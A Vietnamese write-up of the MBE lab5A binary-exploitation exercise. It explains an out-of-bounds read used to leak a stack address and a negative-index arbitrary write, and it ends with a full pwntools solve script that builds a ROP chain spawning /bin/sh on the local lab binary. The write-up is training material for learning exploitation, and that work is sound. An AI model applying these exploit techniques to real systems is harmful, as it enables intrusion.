MBE (Modern Binary Exploitation) là các bài lab khá quen thuộc đối với những người học binary exploit, thông qua các bài lab mình học được khá nhiều kiến thức mới mà mình bị overlooked lúc tìm hiểu web exploitation. Đây là một writeup về lab5A, bài cuối về chủ đề ROP của MBE.

## Source code analysis

Source bài này sẽ khá giống với bài lab3A trong phần shellcode, một storage service cho phép chứa 1 số vào 1 array về đọc số đó ra. tại hàm `read_number` ta có thể dễ dàng thấy được lỗi Out of Bound Reading
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/c186c6cc-325b-418d-abbe-1fb7aaa2698a)

Với lỗi này ta có thể lợi dụng để leak stack address (lab MBE từ section 5 trở xuống thì ASLR luôn tắt, tuy nhiên để làm bài này khó hơn thì mình đã bật ASLR lên). Tại hàm `store_number`, ta thấy có một phần check trước khi dữ liệu được ghi:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/d9144843-1b28-45c2-8801-0596d2449cbe)

Giải thích về 3 phần check:
- `index % 3 == 0` phần check này là để gây khó khăn hơn khi craft ROP gadget, ta sẽ không thể ghi được ở 3 địa chỉ liền kề nhau
- `index > STORAGE_SIZE` có vẻ là để tránh việc Out of Bound Writing, tuy nhiên để ý kỹ thì đáng lẽ nó phải là `index > STORAGE_SIZE-1` vì index bắt đầu từ `0`, do đó ta có 4 byte OOW, kinda useless vì nó chẳng thể chạm đến return address.
- `(input >> 24) == 0xb7` intend của check này là ngăn việc ta có thể ret2libc, nhưng thật ra nó statically linked nên cũng không có libc và ở bài này mình cũng sẽ không dụng đến libc

Vậy nếu ta chỉ có thể ghi đè 4 byte ở sau buffer thì có thể làm được gì nhỉ... nếu để ý lại index nhập vào sẽ là kiểu `int` vậy nếu ta để index âm thì bằng các canh chỉnh chính xác ta có thể store ở bất cứ địa chỉ nào trong memory, OOW thành công.
Sau khi căn chỉnh ta sẽ biết ra được index `-1073741711` sẽ là return address của `main`, lúc đó sẽ trỏ về `__libc_start_main`, vậy giờ ta sẽ ROP như thế nào cho hợp lý... 

Với mình thì mình sẽ chọn 1 ROP gadget như sau, vì việc ROP gadget với 3 address không liên tiếp quá dark, nên mình muốn tìm cách để có thể ghi ROP gadget một cách tự do, idea sẽ là return về `read`.
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/7d5f475b-e02c-479f-b8c4-963517f81beb)

Return về code segment, sẽ bypass qua phần check thứ 3, tuy nhiên thì index `-1073741711 % 3 == 2` và `-1073741711 % 3 == 1`, index tiếp theo là `-1073741709` chắc chắn chia hết cho 3, stack layout cho function `read` sẽ không hoàn thiện được. Cách giải quyết đơn giản, return về một hàm dummy nào đó và đưa `read` vào return address của hàm đó, stack layout:
```
----------------
0x00000001 => dummy_function
0x00000002 => read
0x00000003 => dummy_function's arg 1 (khong control duoc)
0x00000004 => read's arg 1
0x00000005 => read's arg 2 (address bat ki)
0x00000006 => read's arg 3 (khong control duoc) 
----------------
```

`read` nhận 3 tham số, lần lượt là fd, buffer và size, vấn đề tiếp theo là ta lại không control được arg thứ 3, chính là size read vào
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/e3763d94-e278-41f0-a6ce-7ae2100b2ee3)

Như ta thấy thì nếu tại return address là dummy function, thì argument `size` của `read` sẽ rơi vào địa chỉ `0xffffca30`, nghĩa là lúc này `read` sẽ đọc 0 byte, ta sẽ chẳng ghi đè được gì cả...

Nhưng sẽ ra sao nếu nơi mà argument 3 rơi vào là địa chỉ `0xffffca3c`
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/eff385ec-5aa9-4ed1-bb64-2f9df667b3c0)
Lúc này read sẽ đọc `0x80eb00c`, ta sẽ không cần nhiều đến thế nhưng chắc chắn nó sẽ giúp ta ghi đè được address bất kì. Vậy làm sao để ROP cho argument 3 rơi đúng vào ô nhớ đó? Mình sẽ cho return về một ROP pop stack 3 lần, sau đó return về `read` và ghi ROP vào return address của `read`, stack layout giả dụ:

```
----------------
0x00000001 => pop 3 thanh ghi
0x00000002 => ...
0x00000003 => ...
0x00000004 => ...
0x00000005 => read
0x00000006 => read's return address
0x00000007 => 0x0 (read from stdin)
0x00000008 => 0x00000006
0x00000008 => 0x80eb00c
----------------
```

ROP gadget để pop 3 stack:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/dbaf0569-93f5-4859-abee-213575a60a4b)

Vì trước đó thì mình có bật ASLR, nên ta sẽ cần leak địa chỉ của stack bất kì để tìm ra return address của `read`, cùng với đó là vì không có libc nên `/bin/sh` mình sẽ nèm vào phía dưới ROP chain, nên ta cũng cần tính toán offset để tìm ra địa chỉ của `/bin/sh` sau đó pop vào ebx

Solve script:
```
from pwn import *

def write_rop(data, loc, f=None):
    buf = b"store\n"
    buf += str(data).encode() + b"\n"
    buf += loc.encode() + b"\n"
    if f:
        f.write(buf)
    return buf

pop_eax = util.packing.p32(0x080bc4d6)
pop_ecx = util.packing.p32(0x080e6255)
pop_edx = util.packing.p32(0x080695a5)
pop_ebx = util.packing.p32(0x08058ed6)
syscall = util.packing.p32(0x0806fa7f)


bin_sh_string = {}
bin_sh_string["bin"] = util.packing.p32(0x6e69622f)
bin_sh_string["sh"] = util.packing.p32(0x68732f2f)

read = 0x806d85a

# pop 3 thanh ghi
# ...
# ...
# ...
# read
# <not controllable>
# 0x0
# address to write
# 0x80eb00c

pop_3_reg = 0x0806e7bb

proc = process("../lab5A")

proc.sendline(b"read")
proc.sendline(b"-1073741709") # leak stack address
leaked_stack = int(proc.recvline_contains(b"Number at data[-1073741709] is ")[-10:].decode())
stack_ret_addr = leaked_stack - 116
bin_sh_addr = util.packing.p32(stack_ret_addr + 40)

print("leaked stack: " + hex(leaked_stack))
print("return address: " + hex(stack_ret_addr))
print("/bin/sh will be at: " + hex(stack_ret_addr + 40))


rop_chain = pop_ecx
rop_chain += util.packing.p32(0)
rop_chain += pop_edx
rop_chain += util.packing.p32(0)
rop_chain += b"BBBB"
rop_chain += pop_ebx
rop_chain += bin_sh_addr
rop_chain += pop_eax
rop_chain += util.packing.p32(0xb)
rop_chain += syscall
rop_chain += bin_sh_string["bin"]
rop_chain += bin_sh_string["sh"]

proc.send_raw(write_rop(pop_3_reg, "-1073741711"))
proc.send_raw(write_rop(0xffffffff, "-1073741710")) # padding
proc.send_raw(write_rop(read, "-1073741707"))
proc.send_raw(write_rop(0x0, "-1073741705"))
proc.send_raw(write_rop(stack_ret_addr, "-1073741704"))
proc.sendline(b"quit")
proc.send_raw(rop_chain)
proc.sendline(b"/bin/sh")
proc.interactive()
```
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/385ec24f-0e4b-4e39-a71c-d693f8de1719)

